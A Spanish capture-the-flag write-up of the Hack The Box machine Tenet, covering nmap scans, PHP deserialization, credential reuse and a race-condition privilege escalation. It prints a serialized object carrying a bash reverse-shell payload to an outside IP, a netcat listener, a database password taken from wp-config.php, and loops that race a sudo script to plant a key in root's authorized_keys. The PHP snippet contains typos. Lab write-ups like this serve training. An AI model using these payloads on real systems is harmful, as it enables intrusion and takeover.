<h1 align="center">
<br>
  <img src="https://i.gyazo.com/19ee97eb11ba84721416529237cfc74a.png" alt="Front-End Checklist" width="400">
  <br>
  Hack The Box: Tenet
  <br>
</h1>

<h4 align="center">Maquina creada por <a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a></h4>
<h4 align="center">Aquí puedes ver la <a href="https://www.hackthebox.eu/home/machines/profile/309">página web</a> y ver una descripción de ella</h4>

---

# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [Web](#web)
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [PHP Deserialization](#php-deserialization)
- [Post-explotación](#post-explotación)
  - [Movimiento Lateral](#movimiento-lateral)
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
       - [SUDO -L](#sudo--l)
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [Privesc](#privesc)
- [Información Adicional](#información-adicional)


---


## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap --top-ports 5000 10.10.10.223```

El resultado es:

<img src="https://i.gyazo.com/2b9c801e9f2c0df829ed0e68b5e691f9.png">

Lo siguiente ver la información de los servicios y las versiones que tiene esos puertos con este comando:

```nmap -sV -sC -p 22,80 10.10.10.223```

Después comprobaremos si tiene vulnerabilidades con el siguiente comando:

```nmap -Pn -T4 -p 22,80 --script vuln 10.10.10.223```

## Búsqueda de vulnerabilidades

### Web

Añadimos en el archivo **/etc/hosts** el dominio siguiente ```tenet-htb```.

Cuando buscamos encontramos esto:

<img src="https://i.gyazo.com/d205b9c1c86a176d64811bbf462c0be6.png">

Gracias a esto probaremos de encontrar esto el archivo **sator.php** y **sator.php.bak**

Los cuales los encontraremos en el subdominio **sator.tenet.htb** o en la 10.10.10.223/sator.php

## Explotación de vulnerabilidades

### PHP Deserialization

Cuando nos descargamos el archivo sator.php.bak encontramos esto dentro:

<img src="https://i.gyazo.com/3c2661078a0d5388fcef5f07ba8db289.png">

Vemos que utiliza el **arepo** en metodo get.

Gracias a esta [página web](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) vemos como funciona el exploit para el PHP Deserialization.

Así que atraves de **php --interactive** crearemos el contenido php.

```
class DatabaseExport{
public $user_file = 'jose.php';
public $data '<?php shell_exec("bash -c \' bash -i >& /dev/tcp/10.10.14.XXX/5555 0>&1\'"); ?>';
}
print urlenconde(serilize(new DatabaseExport));
```

El resultado que nos imprima lo insertaremos en la variable del metodo get **arepo**.

Por utlimo iremos al archivo creado y obtendremos la shell, añadiendole este comando para poner el puerto en escucha: ```rlwrap nc -nvlp 5555```

## Post-explotación

## Movimiento Lateral

Para tener una shell interactiva usaremos este comando: 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Para pasar del usuario www-data al siguiente usuario neil, leeremos el archivo **wp-config.php** en la carpeta **/var/www/html/wordpress**.

```
/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

La contraseña del usuario **neil** es **Opera2112**

Nos conectaremos por ssh con este comando: ```ssh neil@10.10.10.223```

## Búsqueda de vulnerabilidades

### SUDO -L

Usaremos el comando **sudo -l** para ver que comandos puede realizar como root.

<img src="https://i.gyazo.com/642fda72e968ecb40ea90defb17f7b13.png">

## Explotación de vulnerabilidades

### Privesc

El archivo que ejecuta es el siguiente:

```
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

Gracias a este script podemos ejecutar nuestra clave **.pub** a ```/root/.ssh/authorized_keys```

Lo que haremos es crear un bucle para añadir la publica en un archivo /tmp/ssh-*

```
while true; do echo "CLAVE PUBLICA" | tee /tmp/ssh-* > /dev/null; done
```

> Esto es en una terminal

En la otra terminal tambien conectada por ssh al usuario neil realizaremos este otro bucle, para poder ejecutar el script que hemos visto anteriormente:

```
while true; do sudo /usr/local/bin/enableSSH.sh;done
```

Por último nos conectaremos a root mediante ssh con este comando:```ssh root@10.10.10.223 -i id_rsa```


## Información Adicional

Páginas web utilizadas:

- [PHP Deserialization](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) - Exploit de la deserialización de PHP

**[⬆ back to top](#-----hack-the-box-tenet-)**
